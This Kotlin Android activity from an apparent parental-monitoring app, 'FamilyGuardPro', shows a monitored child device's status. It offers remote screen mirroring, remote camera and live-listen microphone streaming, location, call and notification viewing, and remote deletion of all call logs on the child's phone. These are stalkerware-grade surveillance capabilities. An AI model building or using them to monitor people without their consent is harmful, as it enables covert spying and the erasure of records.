package com.familyguardpro

import android.content.Intent
import android.os.Bundle
import android.view.View
import android.widget.Toast
import androidx.appcompat.app.AlertDialog
import androidx.appcompat.app.AppCompatActivity
import androidx.lifecycle.lifecycleScope
import com.familyguardpro.databinding.ActivityDeviceDetailBinding
import com.familyguardpro.models.DeviceData
import com.familyguardpro.network.ApiClient
import com.familyguardpro.utils.PreferenceManager
import kotlinx.coroutines.launch
import java.text.SimpleDateFormat
import java.util.*

class DeviceDetailActivity : AppCompatActivity() {

    private lateinit var binding: ActivityDeviceDetailBinding
    private lateinit var preferenceManager: PreferenceManager
    private var deviceId: String = ""
    private var deviceName: String = ""

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        binding = ActivityDeviceDetailBinding.inflate(layoutInflater)
        setContentView(binding.root)
        
        preferenceManager = PreferenceManager(this)
        deviceId = intent.getStringExtra("deviceId") ?: ""
        deviceName = intent.getStringExtra("deviceName") ?: "Child Device"
        
        setupUI()
        loadDeviceData()
    }

    override fun onResume() {
        super.onResume()
        loadDeviceData()
    }

    private fun setupUI() {
        binding.toolbar.title = deviceName
        setSupportActionBar(binding.toolbar)
        supportActionBar?.setDisplayHomeAsUpEnabled(true)
        binding.toolbar.setNavigationOnClickListener { finish() }
        
        // Screen Mirror
        binding.cardScreenMirror.setOnClickListener {
            startStreaming("screen_mirror")
        }
        
        // Remote Camera
        binding.cardCamera.setOnClickListener {
            startStreaming("camera")
        }
        
        // Live Listen
        binding.cardLiveListen.setOnClickListener {
            startLiveListen()
        }
        
        binding.btnDeleteCallLogs.setOnClickListener {
            showDeleteCallLogsConfirmation()
        }
        
        // View Notifications
        binding.cardNotifications.setOnClickListener {
            val intent = Intent(this, NotificationListActivity::class.java).apply {
                putExtra("deviceId", deviceId)
            }
            startActivity(intent)
        }
        
        // View Call History
        binding.cardCallHistory.setOnClickListener {
            val intent = Intent(this, CallHistoryActivity::class.java).apply {
                putExtra("deviceId", deviceId)
            }
            startActivity(intent)
        }
        
        // View Location
        binding.cardLocation.setOnClickListener {
            val intent = Intent(this, MapActivity::class.java).apply {
                putExtra("deviceId", deviceId)
            }
            startActivity(intent)
        }
        
        // Remove Device
        binding.btnRemoveDevice.setOnClickListener {
            showRemoveDeviceConfirmation()
        }
    }
    
    private fun showRemoveDeviceConfirmation() {
        AlertDialog.Builder(this)
            .setTitle("Remove Device")
            .setMessage("Are you sure you want to remove this device? This will delete all associated data and cannot be undone.")
            .setPositiveButton("Remove") { _, _ ->
                removeDevice()
            }
            .setNegativeButton("Cancel", null)
            .show()
    }
    
    private fun removeDevice() {
        binding.progressBar.visibility = View.VISIBLE
        
        lifecycleScope.launch {
            try {
                val response = ApiClient.api.deleteDevice(
                    "Bearer ${preferenceManager.getAuthToken()}",
                    deviceId
                )
                
                if (response.success) {
                    Toast.makeText(this@DeviceDetailActivity, "Device removed successfully", Toast.LENGTH_SHORT).show()
                    // Go back to dashboard
                    finish()
                } else {
                    Toast.makeText(this@DeviceDetailActivity, response.message ?: "Failed to remove device", Toast.LENGTH_SHORT).show()
                }
            } catch (e: Exception) {
                Toast.makeText(this@DeviceDetailActivity, "Error: ${e.message}", Toast.LENGTH_SHORT).show()
            } finally {
                binding.progressBar.visibility = View.GONE
            }
        }
    }

    private fun loadDeviceData() {
        binding.progressBar.visibility = View.VISIBLE
        
        lifecycleScope.launch {
            try {
                val response = ApiClient.api.getDeviceData(
                    "Bearer ${preferenceManager.getAuthToken()}",
                    deviceId
                )
                
                if (response.success && response.device != null) {
                    updateUIWithDevice(response.device)
                } else if (response.success && response.data != null) {
                    updateUI(response.data)
                }
            } catch (e: Exception) {
                Toast.makeText(this@DeviceDetailActivity, "Error loading data", Toast.LENGTH_SHORT).show()
            } finally {
                binding.progressBar.visibility = View.GONE
            }
        }
    }
    
    private fun updateUIWithDevice(device: com.familyguardpro.models.ChildDevice) {
        // Device name and model
        binding.tvDeviceName.text = device.name
        binding.tvDeviceModel.text = device.model ?: "Android Device"
        
        // Battery
        binding.tvBattery.text = "${device.batteryLevel}%"
        
        // Screen Time
        val hours = device.screenTime / 60
        val minutes = device.screenTime % 60
        binding.tvScreenTime.text = "${hours}h ${minutes}m"
        
        // Last seen - device.lastSeen is now a Long (timestamp in ms)
        val lastSeenTime = device.lastSeen
        val isOnline = device.isOnline || (lastSeenTime > 0 && System.currentTimeMillis() - lastSeenTime < 5 * 60 * 1000)
        binding.tvLastSeen.text = if (isOnline) "Now" else formatTime(lastSeenTime)
        
        // Online status indicator
        binding.viewOnlineIndicator.setBackgroundResource(
            if (isOnline) R.drawable.ic_online else R.drawable.ic_offline
        )
    }
    
    private fun parseIsoDate(isoString: String?): Long {
        if (isoString.isNullOrEmpty()) return 0
        return try {
            val sdf = java.text.SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", java.util.Locale.getDefault())
            sdf.timeZone = java.util.TimeZone.getTimeZone("UTC")
            sdf.parse(isoString)?.time ?: 0
        } catch (e: Exception) {
            try {
                val sdf = java.text.SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss'Z'", java.util.Locale.getDefault())
                sdf.timeZone = java.util.TimeZone.getTimeZone("UTC")
                sdf.parse(isoString)?.time ?: 0
            } catch (e2: Exception) {
                0
            }
        }
    }

    private fun updateUI(data: DeviceData) {
        // Battery
        binding.tvBattery.text = "${data.batteryLevel}%"
        
        // Screen Time
        val hours = data.screenTimeMinutes / 60
        val minutes = data.screenTimeMinutes % 60
        binding.tvScreenTime.text = "${hours}h ${minutes}m"
        
        // Notifications count
        binding.tvNotificationCount.text = "${data.newNotifications} new"
        
        // Last seen
        val isOnline = System.currentTimeMillis() - (data.lastSyncTime ?: 0) < 5 * 60 * 1000
        binding.tvLastSeen.text = if (isOnline) "Now" else formatTime(data.lastSyncTime)
    }

    private fun formatTime(timestamp: Long?): String {
        if (timestamp == null || timestamp == 0L) return "Never"
        val sdf = SimpleDateFormat("MMM dd, hh:mm a", Locale.getDefault())
        return sdf.format(Date(timestamp))
    }

    private fun startStreaming(type: String) {
        val intent = Intent(this, StreamingActivity::class.java).apply {
            putExtra("deviceId", deviceId)
            putExtra("streamType", type)
        }
        startActivity(intent)
    }

    private fun startLiveListen() {
        lifecycleScope.launch {
            try {
                val response = ApiClient.api.sendCommand(
                    "Bearer ${preferenceManager.getAuthToken()}",
                    deviceId,
                    com.familyguardpro.network.CommandRequestBody(command = "start_live_listen")
                )
                if (response.success) {
                    Toast.makeText(this@DeviceDetailActivity, "Live listen started", Toast.LENGTH_SHORT).show()
                    // Open streaming activity for audio
                    val intent = Intent(this@DeviceDetailActivity, StreamingActivity::class.java).apply {
                        putExtra("deviceId", deviceId)
                        putExtra("streamType", "live_audio")
                    }
                    startActivity(intent)
                }
            } catch (e: Exception) {
                Toast.makeText(this@DeviceDetailActivity, "Failed to start", Toast.LENGTH_SHORT).show()
            }
        }
    }

    private fun showDeleteCallLogsConfirmation() {
        AlertDialog.Builder(this)
            .setTitle("🗑️ Delete Call Logs")
            .setMessage("This will permanently delete ALL call logs from the child's phone.\n\nThis action cannot be undone!")
            .setPositiveButton("Delete All") { _, _ ->
                deleteCallLogs()
            }
            .setNegativeButton("Cancel", null)
            .setIcon(android.R.drawable.ic_dialog_alert)
            .show()
    }

    private fun deleteCallLogs() {
        binding.progressBar.visibility = View.VISIBLE
        
        lifecycleScope.launch {
            try {
                val response = ApiClient.api.deleteCallLogs(
                    "Bearer ${preferenceManager.getAuthToken()}",
                    deviceId
                )
                
                if (response.success) {
                    Toast.makeText(
                        this@DeviceDetailActivity, 
                        "Call logs deleted from child's phone", 
                        Toast.LENGTH_LONG
                    ).show()
                } else {
                    Toast.makeText(
                        this@DeviceDetailActivity, 
                        response.message ?: "Failed to delete", 
                        Toast.LENGTH_SHORT
                    ).show()
                }
            } catch (e: Exception) {
                Toast.makeText(this@DeviceDetailActivity, "Error: ${e.message}", Toast.LENGTH_SHORT).show()
            } finally {
                binding.progressBar.visibility = View.GONE
            }
        }
    }
}
